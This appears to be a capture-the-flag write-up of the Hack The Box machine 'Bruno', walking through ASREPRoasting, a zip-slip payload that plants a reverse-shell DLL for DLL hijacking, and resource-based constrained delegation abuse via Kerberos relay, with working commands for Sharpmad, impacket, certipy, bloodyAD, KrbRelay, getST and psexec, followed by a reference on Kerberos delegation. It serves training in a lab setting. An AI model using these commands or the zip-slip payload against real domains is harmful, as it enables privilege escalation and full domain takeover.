---
title: "HTB: Bruno"
date: 2026-11-06
draft: false
tags: ["htb", "windows", "active-directory", "asreproast", "zip-slip", "dll-hijacking", "rbcd", "kerberos-relay"]
cover:
  image: /images/htb-bruno-cover.jpg
  alt: "A zipped shell slipping through a scanner queue toward a Kerberos ticket, phosphor green on black"
  relative: false
---

Bruno. Windows, medium, retired. The chain in one line: account name in an SMB share → ASREPRoasting → writable SMB share → decompile the scanner → zip slip via SMB write → DLL hijacking → SeMachineAccountPrivilege → resource-based constrained delegation via Kerberos relay.

But the box isn't really about the chain. It's about a scanner that does exactly what it says it does — unzip whatever you give it, wherever you tell it to — and a domain where creating a machine account is the key to everything.

## Initial access

There is an anonymous-auth readable FTP share that has some custom software and a changelog. The changelog suggests that there is an account named `svc-scan`, and that there is a site at subdomain "dev". Navigating to `dev.bruno.vl` shows a site that appears to be analyzing uploaded EXEs and classifying them as benign or malicious. You can upload exes through this site.

`svc-scan` is a valid account. It has write access to the SMB share "queue", which corresponds to the queue for uploaded exes in the website.

Decompiling the custom "SampleScanner.dll" with dnSpy, on a Windows VM, shows that it is unzipping any `.zip` in the queue, concatenating the archive name to the path of the queue as the unzip destination. This is a potential zip slip vulnerability, whereby controlling the archive name I can control the destination unzip location, via path traversal. (Technically it can also be done by using an absolute path.)

This can be used for DLL hijacking. Using procmon64a.exe (for ARM) in a Windows VM, you can analyze the DLLs called, looking for one whose path is relative, and that is not found. Specifically, look for:

- A path that is searched on your local VM relative to the working directory of the application, that is
- A CreateFile event, that has
- A NAME NOT FOUND result, that
- Is being loaded — stack trace shows LoadLibraryExW

A shell can be zipped with a path-traversed archive name, using Python as follows, where `shell.dll` is an msfvenom generated revshell, `../app` is the directory the target exe resides in (and thus DLLs will be searched for in), and `hostfxr.dll` is the hijackable DLL:

```python
import zipfile
with zipfile.ZipFile('shell.zip', 'a') as z:
    z.write('shell.dll', '../app/hostfxr.dll')
```

This can't be uploaded through the website, which only accepts exes, but it can be written to the queue SMB share. The scanner application runs automatically on a schedule, so when it is unzipped, you get a shell. Shell as `svc-scan` user.

## Root: resource-based constrained delegation

`whoami /priv` reveals the SeMachineAccountPrivilege. Checking for machine account quota reveals 10 machine accounts can be created (this is default). You can check with nxc:

```bash
nxc ldap <dc> -d <domain> -u <user> -p <pass> -M maq
```

Or with ldapsearch (where domain is `domain.local`):

```bash
ldapsearch -x -H ldap://<ip> -b 'DC=domain, DC=local' -D "<user>@domain.local" -w "<pass>" "(objectclass=domain)" | grep ms-DS-MachineAccountQuota
```

When machine accounts can be created, it is worth checking for resource-based constrained delegation.

The abuse, in short: if the attacker-controlled account can write to attributes on a target account (probably a machine account), and that target account has a valuable SPN like HOST or CIFS or something, then the attacker can set `msDS-AllowedToActOnBehalfOfOtherIdentity`. They can then create a machine account, and use RBCD to impersonate any user (i.e. Administrator) to that service.

If the machine account quota is greater than 0 (it is 10 by default), then the attacker can create a machine account. By default, machine accounts have SPNs, which provides the attacker a source service to impersonate a user, to a target service.

Here, the write to the target host's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute was done without write permission over the target, via a Kerberos relay: if LDAP signing isn't enabled, you can perform a Kerberos relay attack, relaying authentication from the DC back to the DC, and modify the attribute to include your source machine. This works by creating a fake OXID, on a proper port, and finding a CLSID that requires authentication by the target host. The authentication is then sent back to the DC. KrbRelay.exe does most of this for you.

```bash
# Find port you can host OXID on
.\CheckPort.exe

# Find CLSIDs
.\GetCLSID.ps1

# Brute force CLSIDs to find one that forces authentication, for each CLSID:
.\KrbRelay.exe -spn ldap/<dc-fqdn> -clsid <clsid> -rbcd <SID-of-new-computer-account> -port <port-from-prev-step>
```

Then get a TGS as Administrator, from the attacking machine:

```bash
getST.py -spn cifs/<dc-fqdn> -impersonate Administrator -dc-ip <dc-ip> <domain>/<new-machine-account>$:'<password>'

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <dc-fqdn>
```

---

## Takeaways

The initial access is the memorable part: the scanner is doing nothing wrong by its own lights. It unzips what you give it, where the archive name says. The vulnerability is that the archive name is attacker-controlled, and nobody checked it. DLL hijacking then falls out of the same carelessness — a relative path, a missing DLL, a LoadLibraryExW in the stack trace.

The root is a whole different lesson, and the notes from this box are really a study guide for Kerberos delegation in general — worth keeping in full below. The one-line version: a machine account quota of 10 is not a harmless default. It's a source account, with SPNs, waiting to be created, and if LDAP signing isn't enforced, a relay turns it into Administrator.

---

## Reference

A few things worth keeping from this box's notes:

**What is Kerberos delegation?** Kerberos delegation allows a service to impersonate as a user to another service. For example, a webserver accessing a database as a user.

In the following explanations, there are six important entities:

- **KDC:** the KDC
- **Source host:** The account (typically machine account) that holds the SPN associated with the source service
- **Source service:** The service that wants to impersonate as a user to another service
- **Target host:** The account (typically machine account) that holds the SPN associated with the target service(s)
- **Target service(s):** The services that the source service wants to interact with on behalf of a user
- **Target user / desired user:** The user the source service wants to impersonate (interact with the target service on behalf of)

**What is unconstrained delegation?** Unconstrained delegation works as follows: the TrustedForDelegation attribute is set to true on a source host. A user (target user) authenticates to the source service. Because this attribute is set, the authenticating user's TGT is included in the TGS sent to the source service upon authentication. The source service can now authenticate as that user to any service.

Unconstrained delegation is dangerous because if the source host is compromised, the attacker now has a TGT for any user that has authenticated to the source host.

**What is constrained delegation?** In contrast with unconstrained delegation, which grants the source service a TGT for the target user, in constrained delegation, TGSs are granted to the source service. This is more secure.

Constrained delegation is enabled if the source host has the `msDS-AllowedToDelegateTo` attribute set to the SPNs of services. The source host's services can impersonate to those services.

Constrained delegation has an additional mechanism that supports protocol transition between NTLM (or anything else) and Kerberos. The problem is this — if a user authenticates via NTLM, a service ticket isn't sent to the source service. This means there is no proof that the target user authenticated to the service and thus no proof that the service should be allowed to impersonate that user. This is solved via the S4U2Self mechanism. This is simply that the source service can request a TGS for itself as the target user, as if the target user authenticated to it. It can then move on to request a TGS from the KDC to the target services as the target user — this second step is called S4U2Proxy.

**What is resource-based constrained delegation?** In unconstrained delegation, the attribute that allows impersonation is called TrustedForDelegation. In constrained delegation, it is `msDS-AllowedToDelegateTo`. In both cases, the attribute is set on the source host. In resource-based constrained delegation, the attribute is called `msDS-AllowedToActOnBehalfOfOtherIdentity`, and it is set on the target host. It contains the list of source accounts (source hosts) that can impersonate to the target host's services (any service the target host has an SPN for).

Summary of the 3 types of delegation:

- Unconstrained delegation allows you to specify whether an account can impersonate other users.
- Constrained delegation allows you to specify which services an account can impersonate to as other users.
- Resource-based constrained delegation allows you to specify which accounts can impersonate to an account, as other users.

**How can RBCD be abused?** If the attacker-controlled account can write to attributes on a target account (probably a machine account), and that target account has a valuable SPN like HOST or CIFS or something, then the attacker can set `msDS-AllowedToActOnBehalfOfOtherIdentity`. They can then create a machine account, and use RBCD to impersonate any user (i.e. Administrator) to that service.

**How is RBCD related to creating machine accounts?** If the machine account quota is greater than 0 (it is 10 by default), then the attacker can create a machine account. By default, machine accounts have SPNs, which provides the attacker a source service to impersonate a user, to a target service.

**How can you check for RBCD?** nxc or ldapsearch can be used to check the machine account quota, as shown earlier. BloodHound can be used to check for write access to attributes of hosts.

To check if LDAP signing is enabled:

```bash
nxc ldap <dc-ip> -u <user> -p <pass> -M ldap-checker
```

**Steps for abusing RBCD.** Check for machine account quota as above. Check for write access over target host with BloodHound.

Create a computer object:

Windows (local):

```powershell
.\Sharpmad.exe MAQ -Action new -MachineAccount 'NEWPC$' -MachinePassword 'P@ssw0rd'
```

Linux (remote), certipy:

```bash
certipy account create -u '<auth-user>'@'<domain>' -p '<pass>' -dc-host <dc-host> -ns <ns-ip> -user '<new-machine-name>$' -pass '<new-pass>'
```

Linux (remote), impacket:

```bash
impacket-addcomputer -computer-name '<new-machine-name>$' -computer-pass '<new-pass>' -dc-host '<dc-host>' -domain-netbios '<domain>' '<domain>'/'<auth-user>':'<pass>'
```

Linux (remote), bloodyAD:

```bash
bloodyAD -d '<domain>' -u '<user>' -p '<pass>' --host '<dc-host>' add computer '<new-machine-name>' '<new-pass>'
```

Write to target host's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, to include created machine account:

With write permission over target, Windows (local):

```powershell
Set-ADComputer -Identity <target-hostname> -PrincipalsAllowedToDelegateToAccount <new-machine-name>
```

With write permission over target, Linux (remote):

```bash
impacket-rbcd -delegate-from '<source-host>' -delegate-to '<target-host>$' -dc-ip <dc-ip> -action write '<domain>'/'<auth-user>':'<pass>'
```

Without write permission over target (Kerberos relay): as described in the Root section above — fake OXID, a CLSID that forces SYSTEM authentication, relay the DC's authentication back to the DC, and let KrbRelay.exe set the attribute.

**What is Kerberos relay?** A Kerberos relay attack is when Kerberos authentication is made to the attacker, and they relay it to the target. This can be done via COM authentication.

**What is COM?** Component Object Model is what Windows uses to activate or create code instances on machines. It can occur remotely via RPC, called DCOM.

**What is a CLSID?** A CLSID is just an identifier for a class of COM objects.

**What is meant by a "proper" or "valid" port?** A valid port in the case of this attack is one that allows SYSTEM to authenticate to it.

**What is meant by a valid CLSID?** A valid CLSID in the case of this attack is a CLSID corresponding to a COM object that requires SYSTEM authentication, necessary for relaying.

**What is OXID?** An OXID resolver is an RPC service, on port 135, that tells a client which port to access for DCOM.
